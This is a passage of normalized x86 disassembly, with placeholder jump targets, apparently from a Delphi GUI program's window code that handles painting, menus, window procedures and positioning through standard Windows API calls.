mov eax [ ebp - 0x4 ]
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_450a20
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_462bf4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_469458
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_468da5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_468d88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4256c8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425568
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4640dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d8f
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4256c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_462bf4
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_469458
call sub_456054
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_468ed3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424d10
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_468eac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_468e8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4256c8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_425568
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e96
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4256c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_456054
mov esi eax
sub_468eb3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ReleaseDC
retn
sub_468f64
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_468fb0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46948c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4694d8
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_468ff0
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_4691be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453d08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44f398
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44e190
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_468f64
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424bf4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_46948c
test eax eax
je r-xdata
push ebp
call sub_468f64
pop ecx
push ebp
call sub_468f64
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_468fb0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_4662b4
jmp r-xdata
sub_4691d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_467498
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_46923c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_467b34
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_421994
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_452e78
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_456054
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_421968
call sub_463738
mov edx esi
mov eax ebx
call sub_421968
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
sub_4692d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_469351
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_46935c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4535f4
sub_469388
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_4535f4
xor edx edx
jmp r-xdata
mov eax esi
call sub_467614
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_4693c0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_44f058
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_4535f4
sub_469404
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f164
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_469458
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_44c734
sub_46948c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46cffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46cfe8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4694d8
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46cffc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cfe8
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_469528
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418854
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_469558
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_456054
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46cfcc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46cfcc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_469528
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46cfcc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46cfb8
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4189b0
call sub_4032b0
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46cfb8
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46cfb8
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46cfb8
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_46965c
push ebx
mov ebx eax
mov eax ebx
call sub_469654
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_4297ec
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_469684
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_4535ac
mov dl 0x1
mov eax esi
call sub_4699e8
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_469a64
mov edx eax
mov eax esi
call sub_44f9f4
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_453748
mov dl 0x1
mov eax esi
call sub_468a08
sub_469704
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_456054
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45fd34
mov edi eax
mov eax ebp
call sub_456054
push eax
call DrawMenuBar
sub_469780
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_421440
xor edx edx
mov eax ebx
call sub_4616cc
sub_4697a4
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_469704
mov eax edx
mov edx ebx
call sub_421440
sub_4697cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469992
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46cffc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_463280
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46cfe8
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_421440
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46cfe8
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
mov eax ebx
call sub_456358
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_456054
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_469704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469999
lea eax [ ebp - 0x10 ]
call sub_4040ac
retn
mov dl 0x1
mov eax ebx
call sub_46a890
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_456054
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_456054
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_456054
mov edx eax
mov eax esi
call sub_463280
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_456054
push eax
call SetMenu
sub_4699b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4699a0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_469a10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_469a04
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_469a7c
push ebx
mov ebx eax
mov eax ebx
call sub_45566c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_469a64
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_469a64
mov edx eax
mov eax ebx
call sub_44f9f4
mov edx 0xff00000f
mov eax ebx
call sub_44f9f4
pop ebx
retn
sub_469b00
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_456054
push eax
call ShowWindow
sub_469b40
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_469558
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_469558
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_46cfcc
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46cfb8
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_469558
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_46cfcc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46cfb8
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cca0
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccd4
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cca0
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccd4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cca0
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccd4
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cc88
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccd4
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46ccbc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_46cfb8
call sub_46cca0
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_469e94
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_467448
mov edx esi
mov eax edi
call sub_46c838
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
